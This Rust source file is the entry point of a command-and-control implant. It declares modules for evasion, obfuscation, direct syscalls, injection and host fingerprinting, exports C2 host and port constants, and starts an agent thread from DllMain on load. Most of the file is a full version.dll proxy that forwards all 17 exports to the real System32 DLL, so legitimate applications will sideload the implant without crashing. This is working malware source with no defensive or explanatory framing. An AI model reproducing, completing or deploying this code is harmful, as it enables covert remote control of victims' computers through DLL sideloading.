#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod channel;
mod crypto;
mod evasion;
mod executor;
mod obfs;
mod task;
mod syscall;
mod inject;
mod loader;
mod fingerprint;
mod agent_loop;

pub use agent_loop::{Session, C2_HOST, C2_PORT, BUILD_UUID};

// DLL_PROCESS_ATTACH = 1
#[cfg(target_os = "windows")]
#[no_mangle]
pub extern "system" fn DllMain(
    _hmodule: isize,
    reason: u32,
    _reserved: *mut core::ffi::c_void,
) -> i32 {
    if reason == 1 {
        unsafe {
            windows_sys::Win32::System::Threading::CreateThread(
                core::ptr::null_mut(),
                0,
                Some(agent_thread),
                core::ptr::null_mut(),
                0,
                core::ptr::null_mut(),
            );
        }
    }
    1
}

#[cfg(target_os = "windows")]
unsafe extern "system" fn agent_thread(_: *mut core::ffi::c_void) -> u32 {
    agent_loop::run();
    0
}

// ── version.dll proxy exports (dll-sideload feature) ────────────────────────
// Forward every version.dll export to the real System32 copy so host
// applications that import version.dll can load our DLL without crashing.
// The absolute System32 path prevents Windows from sideloading us recursively.
#[cfg(all(target_os = "windows", feature = "dll-sideload"))]
mod version_proxy {
    use core::sync::atomic::{AtomicIsize, Ordering};
    use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};

    static REAL: AtomicIsize = AtomicIsize::new(0);

    unsafe fn real_dll() -> isize {
        let h = REAL.load(Ordering::Relaxed);
        if h != 0 { return h; }
        let path = b"C:\\Windows\\System32\\version.dll\0";
        let new_h = LoadLibraryA(path.as_ptr());
        REAL.store(new_h, Ordering::Relaxed);
        new_h
    }

    // Resolve a proc from the real DLL, transmuted to the requested function type.
    // SAFETY: caller must ensure T matches the actual export's calling convention and signature.
    unsafe fn resolve<T: Copy>(name: &[u8]) -> Option<T> {
        let h = real_dll();
        if h == 0 { return None; }
        GetProcAddress(h, name.as_ptr()).map(|f| core::mem::transmute_copy(&f))
    }

    // All 17 version.dll exports — proxy each to the real System32 implementation.
    // Signatures use primitive-width equivalents to avoid importing every Windows type.

    #[no_mangle]
    pub unsafe extern "system" fn GetFileVersionInfoA(a: usize, b: u32, c: u32, d: usize) -> i32 {
        type F = unsafe extern "system" fn(usize, u32, u32, usize) -> i32;
        resolve::<F>(b"GetFileVersionInfoA\0").map_or(0, |f| f(a, b, c, d))
    }
    #[no_mangle]
    pub unsafe extern "system" fn GetFileVersionInfoW(a: usize, b: u32, c: u32, d: usize) -> i32 {
        type F = unsafe extern "system" fn(usize, u32, u32, usize) -> i32;
        resolve::<F>(b"GetFileVersionInfoW\0").map_or(0, |f| f(a, b, c, d))
    }
    #[no_mangle]
    pub unsafe extern "system" fn GetFileVersionInfoExA(a: u32, b: usize, c: u32, d: usize) -> i32 {
        type F = unsafe extern "system" fn(u32, usize, u32, usize) -> i32;
        resolve::<F>(b"GetFileVersionInfoExA\0").map_or(0, |f| f(a, b, c, d))
    }
    #[no_mangle]
    pub unsafe extern "system" fn GetFileVersionInfoExW(a: u32, b: usize, c: u32, d: usize) -> i32 {
        type F = unsafe extern "system" fn(u32, usize, u32, usize) -> i32;
        resolve::<F>(b"GetFileVersionInfoExW\0").map_or(0, |f| f(a, b, c, d))
    }
    #[no_mangle]
    pub unsafe extern "system" fn GetFileVersionInfoSizeA(a: usize, b: usize) -> u32 {
        type F = unsafe extern "system" fn(usize, usize) -> u32;
        resolve::<F>(b"GetFileVersionInfoSizeA\0").map_or(0, |f| f(a, b))
    }
    #[no_mangle]
    pub unsafe extern "system" fn GetFileVersionInfoSizeW(a: usize, b: usize) -> u32 {
        type F = unsafe extern "system" fn(usize, usize) -> u32;
        resolve::<F>(b"GetFileVersionInfoSizeW\0").map_or(0, |f| f(a, b))
    }
    #[no_mangle]
    pub unsafe extern "system" fn GetFileVersionInfoSizeExA(a: u32, b: usize, c: usize) -> u32 {
        type F = unsafe extern "system" fn(u32, usize, usize) -> u32;
        resolve::<F>(b"GetFileVersionInfoSizeExA\0").map_or(0, |f| f(a, b, c))
    }
    #[no_mangle]
    pub unsafe extern "system" fn GetFileVersionInfoSizeExW(a: u32, b: usize, c: usize) -> u32 {
        type F = unsafe extern "system" fn(u32, usize, usize) -> u32;
        resolve::<F>(b"GetFileVersionInfoSizeExW\0").map_or(0, |f| f(a, b, c))
    }
    #[no_mangle]
    pub unsafe extern "system" fn GetFileVersionInfoByHandle(a: u32, b: usize, c: u32, d: u32, e: usize) -> i32 {
        type F = unsafe extern "system" fn(u32, usize, u32, u32, usize) -> i32;
        resolve::<F>(b"GetFileVersionInfoByHandle\0").map_or(0, |f| f(a, b, c, d, e))
    }
    #[no_mangle]
    pub unsafe extern "system" fn VerFindFileA(a: u32, b: usize, c: usize, d: usize, e: usize, f_: usize, g: usize, h: usize) -> u32 {
        type F = unsafe extern "system" fn(u32, usize, usize, usize, usize, usize, usize, usize) -> u32;
        resolve::<F>(b"VerFindFileA\0").map_or(0, |f| f(a, b, c, d, e, f_, g, h))
    }
    #[no_mangle]
    pub unsafe extern "system" fn VerFindFileW(a: u32, b: usize, c: usize, d: usize, e: usize, f_: usize, g: usize, h: usize) -> u32 {
        type F = unsafe extern "system" fn(u32, usize, usize, usize, usize, usize, usize, usize) -> u32;
        resolve::<F>(b"VerFindFileW\0").map_or(0, |f| f(a, b, c, d, e, f_, g, h))
    }
    #[no_mangle]
    pub unsafe extern "system" fn VerInstallFileA(a: u32, b: usize, c: usize, d: usize, e: usize, f_: usize, g: usize, h: usize) -> u32 {
        type F = unsafe extern "system" fn(u32, usize, usize, usize, usize, usize, usize, usize) -> u32;
        resolve::<F>(b"VerInstallFileA\0").map_or(0, |f| f(a, b, c, d, e, f_, g, h))
    }
    #[no_mangle]
    pub unsafe extern "system" fn VerInstallFileW(a: u32, b: usize, c: usize, d: usize, e: usize, f_: usize, g: usize, h: usize) -> u32 {
        type F = unsafe extern "system" fn(u32, usize, usize, usize, usize, usize, usize, usize) -> u32;
        resolve::<F>(b"VerInstallFileW\0").map_or(0, |f| f(a, b, c, d, e, f_, g, h))
    }
    #[no_mangle]
    pub unsafe extern "system" fn VerLanguageNameA(a: u32, b: usize, c: u32) -> u32 {
        type F = unsafe extern "system" fn(u32, usize, u32) -> u32;
        resolve::<F>(b"VerLanguageNameA\0").map_or(0, |f| f(a, b, c))
    }
    #[no_mangle]
    pub unsafe extern "system" fn VerLanguageNameW(a: u32, b: usize, c: u32) -> u32 {
        type F = unsafe extern "system" fn(u32, usize, u32) -> u32;
        resolve::<F>(b"VerLanguageNameW\0").map_or(0, |f| f(a, b, c))
    }
    #[no_mangle]
    pub unsafe extern "system" fn VerQueryValueA(a: usize, b: usize, c: usize, d: usize) -> i32 {
        type F = unsafe extern "system" fn(usize, usize, usize, usize) -> i32;
        resolve::<F>(b"VerQueryValueA\0").map_or(0, |f| f(a, b, c, d))
    }
    #[no_mangle]
    pub unsafe extern "system" fn VerQueryValueW(a: usize, b: usize, c: usize, d: usize) -> i32 {
        type F = unsafe extern "system" fn(usize, usize, usize, usize) -> i32;
        resolve::<F>(b"VerQueryValueW\0").map_or(0, |f| f(a, b, c, d))
    }
}
